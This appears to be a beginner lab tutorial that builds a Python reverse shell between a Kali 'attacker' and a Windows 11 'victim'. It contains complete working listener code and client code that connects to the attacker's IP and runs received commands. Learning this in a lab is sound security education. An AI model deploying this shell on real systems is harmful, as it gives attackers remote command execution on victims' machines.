
# Python Reverse Shell – Beginner Cybersecurity Project

This project demonstrates a **basic reverse shell in Python** between a **Windows 11 target** and a **Kali Linux attacker** over a local network. It is intended for educational use **within a safe, virtual lab environment**.

## ⚠️ Warning

**Educational Use Only** – Do not use these techniques on systems or networks without explicit authorization.

---

## Step 0: Prepare the Lab

- Kali Linux = Attacker (IP: `192.168.44.128`)
- Windows 11 = Victim (IP: `192.168.44.130`)
- Ensure both are on the same virtual network.

Screenshot:  
`PythonReverseShell/screenshots/step0-network.png`

---

## Step 1: Create the Listener (Kali)

Create a file named `listener.py` with the following content:

```python
import socket

listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
listener.bind(("0.0.0.0", 4444))
listener.listen(1)
print("[+] Listening on port 4444...")

connection, address = listener.accept()
print(f"[+] Connection from {address}")

while True:
    command = input("Shell> ")
    connection.send(command.encode())
    result = connection.recv(1024).decode()
    print(result)
```

Screenshot:  
`PythonReverseShell/screenshots/step1-listener.png`

---

## Step 2: Create the Reverse Shell (Windows 11)

Create a file named `reverse_shell.py` on Windows 11 with:

```python
import socket
import subprocess

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.44.128", 4444))

while True:
    command = s.recv(1024).decode()
    output = subprocess.getoutput(command)
    s.send(output.encode())
```

Screenshot:  
`PythonReverseShell/screenshots/step2-shellcode.png`

---

## Step 3: Transfer `reverse_shell.py` to Windows

Use any method (USB, shared folder, etc.). Open it with Python on Windows.

Screenshot:  
`PythonReverseShell/screenshots/step3-transfer.png`

---

## Step 4: Run the Listener

On **Kali**, start the listener:

```bash
python3 listener.py
```

Screenshot:  
`PythonReverseShell/screenshots/start-listener.png`

---

## Step 5: Run the Reverse Shell on Windows

Double-click `reverse_shell.py` (or run via terminal if Python is installed).

Screenshot:  
`PythonReverseShell/screenshots/win11-execute.png`

---

## Step 6: Shell Access

If successful, you'll see a shell prompt in Kali. You can now send commands to the Windows machine.

Screenshot:  
`PythonReverseShell/screenshots/active-shell.png`

---

## What You Learned

- How reverse shells work
- Basic socket programming in Python
- How to simulate an attack in a virtual lab

---

## Tags

`#ReverseShell` `#Python` `#Cybersecurity` `#BeginnerProject` `#EthicalHacking` `#SocketProgramming`
